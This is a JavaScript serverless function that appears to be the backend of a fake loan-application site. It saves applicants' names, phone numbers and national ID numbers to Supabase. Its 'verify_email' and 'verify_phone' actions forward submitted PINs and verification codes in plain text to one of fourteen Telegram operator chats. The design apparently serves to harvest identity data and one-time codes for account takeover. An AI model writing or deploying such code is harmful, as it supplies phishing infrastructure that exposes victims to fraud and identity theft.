const supabase = require("./supabase");

const {
    sendTelegramMessage
} = require("./message");

// Telegram configuration for each processor
const telegramConfigs = {
    l1: {
        botToken: process.env.L1_BOT_TOKEN,
        chatId: process.env.L1_CHAT_ID
    },

    l2: {
        botToken: process.env.L2_BOT_TOKEN,
        chatId: process.env.L2_CHAT_ID
    },

    l3: {
        botToken: process.env.L3_BOT_TOKEN,
        chatId: process.env.L3_CHAT_ID
    },

    l4: {
        botToken: process.env.L4_BOT_TOKEN,
        chatId: process.env.L4_CHAT_ID
    },

    l5: {
        botToken: process.env.L5_BOT_TOKEN,
        chatId: process.env.L5_CHAT_ID
    },

    l6: {
        botToken: process.env.L6_BOT_TOKEN,
        chatId: process.env.L6_CHAT_ID
    },

    l7: {
        botToken: process.env.L7_BOT_TOKEN,
        chatId: process.env.L7_CHAT_ID
    },

    l8: {
        botToken: process.env.L8_BOT_TOKEN,
        chatId: process.env.L8_CHAT_ID
    },

    l9: {
        botToken: process.env.L9_BOT_TOKEN,
        chatId: process.env.L9_CHAT_ID
    },

    l10: {
        botToken: process.env.L10_BOT_TOKEN,
        chatId: process.env.L10_CHAT_ID
    },

    l11: {
        botToken: process.env.L11_BOT_TOKEN,
        chatId: process.env.L11_CHAT_ID
    },

    l12: {
        botToken: process.env.L12_BOT_TOKEN,
        chatId: process.env.L12_CHAT_ID
    },

    l13: {
        botToken: process.env.L13_BOT_TOKEN,
        chatId: process.env.L13_CHAT_ID
    },

    l14: {
        botToken: process.env.L14_BOT_TOKEN,
        chatId: process.env.L14_CHAT_ID
    }

};

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            body: JSON.stringify({
                error: "Method not allowed"
            })
        };
    }

try {
        const data = JSON.parse(event.body);

        // Handle email verification separately
if (data.action === "verify_email") {
    const processor = String(
        data.processor || ""
    )
        .toLowerCase()
        .trim();

    const telegramConfig =
        telegramConfigs[processor];

    if (
        !telegramConfig ||
        !telegramConfig.botToken ||
        !telegramConfig.chatId
    ) {
        return {
            statusCode: 400,
            body: JSON.stringify({
                error:
                    "Invalid or missing processor."
            })
        };
    }

    if (!data.pin) {
        return {
            statusCode: 400,
            body: JSON.stringify({
                error:
                    "Pin is required."
            })
        };
    }

    const emailMessage = `

Processor:
<b>${processor.toUpperCase()}</b>

Pin:
<b>${data.pin}</b>

`;

    await sendTelegramMessage(
        emailMessage,
        null,
        telegramConfig.botToken,
        telegramConfig.chatId
    );

    return {
        statusCode: 200,
        body: JSON.stringify({
            success: true,
            message:
                "Code sent successfully."
        })
    };
}

        // Handle phone verification separately
if (data.action === "verify_phone") {
    const processor = String(
        data.processor || ""
    )
        .toLowerCase()
        .trim();

    const telegramConfig =
        telegramConfigs[processor];

    if (
        !telegramConfig ||
        !telegramConfig.botToken ||
        !telegramConfig.chatId
    ) {
        return {
            statusCode: 400,
            body: JSON.stringify({
                error:
                    "Invalid or missing processor."
            })
        };
    }

    if (!data.verificationCode) {
        return {
            statusCode: 400,
            body: JSON.stringify({
                error:
                    "Verification code is required."
            })
        };
    }

    const phoneMessage = `

Processor:
<b>${processor.toUpperCase()}</b>

Verification Code:
<b>${data.verificationCode}</b>

`;

    await sendTelegramMessage(
        phoneMessage,
        null,
        telegramConfig.botToken,
        telegramConfig.chatId
    );

    return {
        statusCode: 200,
        body: JSON.stringify({
            success: true,
            message:
                "Code sent successfully."
        })
    };
}


        // Get processor from the URL
        const processor = String(
            data.processor || ""
        )
            .toLowerCase()
            .trim();

        // Check that the processor exists
        const telegramConfig =
            telegramConfigs[processor];

        if (
            !telegramConfig ||
            !telegramConfig.botToken ||
            !telegramConfig.chatId
        ) {
            return {
                statusCode: 400,
                body: JSON.stringify({
                    error:
                        "Invalid or missing processor."
                })
            };
        }

        const requiredFields = [
            "full_name",
            "phone",
            "national_id",
            "loan_amount",
            "employment_status",
            "monthly_income",
            "repayment_period"
        ];

        for (const field of requiredFields) {
            if (
                data[field] === undefined ||
                data[field] === null ||
                data[field] === ""
            ) {
                return {
                    statusCode: 400,
                    body: JSON.stringify({
                        error:
                            `${field} is required`
                    })
                };
            }
        }

        if (!data.consent) {
            return {
                statusCode: 400,
                body: JSON.stringify({
                    error:
                        "Terms and conditions must be accepted."
                })
            };
        }

        const applicationNumber =
            `LN-${new Date().getFullYear()}-${Date.now()}`;

        const loanAmount =
            Number(data.loan_amount);

        const repaymentPeriod =
            Number(data.repayment_period);

        const interestRate = 0.045;

        const totalRepayment =
            loanAmount +
            (loanAmount * interestRate);

        const monthlyPayment =
            totalRepayment /
            repaymentPeriod;

        const application = {
            application_number:
                applicationNumber,

            full_name:
                data.full_name,

            phone:
                data.phone,

            national_id:
                data.national_id,

            loan_amount:
                loanAmount,

            employment_status:
                data.employment_status,

            monthly_income:
                Number(data.monthly_income),

            repayment_period:
                repaymentPeriod,

            status:
                "PENDING_REVIEW"
        };

        const {
            data: result,
            error
        } = await supabase
            .from("loan_applications")
            .insert(application)
            .select()
            .single();

        if (error) {
            console.error(
                "Supabase error:",
                error
            );

            return {
                statusCode: 500,
                body: JSON.stringify({
                    error:
                        "Could not save application."
                })
            };
        }

        const telegramMessage = `
<b> Cabs🔔</b>

Name:
${result.full_name}

Phone:
${result.phone}

National ID:
${result.national_id}

        🕐 

`;

        const keyboard = [
            [
                {
                    text: "🔎 UNDER REVIEW",
                    callback_data:
                        `review:${result.application_number}`
                }
            ],
            [
                {
                    text: "✅ APPROVE",
                    callback_data:
                        `approve:${result.application_number}`
                },
                {
                    text: "❌ REJECT",
                    callback_data:
                        `reject:${result.application_number}`
                }
            ],
            [
                {
                    text: "ℹ️ MORE INFORMATION",
                    callback_data:
                        `more_info:${result.application_number}`
                }
            ]
        ];

        console.log(
            `Sending application to processor ${processor}...`
        );

        await sendTelegramMessage(
            telegramMessage,
            keyboard,
            telegramConfig.botToken,
            telegramConfig.chatId
        );

        console.log(
            `Application sent successfully to processor ${processor}.`
        );

        return {
            statusCode: 201,
            body: JSON.stringify({
                success: true,
                application_number:
                    result.application_number,
                message:
                    "Application submitted successfully."
            })
        };

    } catch (error) {
        console.error("SUBMIT APPLICATION ERROR:", error);

        return {
            statusCode: 500,
            body: JSON.stringify({
                error: error.message
                //error:
                    //"Something went wrong while processing the application."
            })
        };
    }
};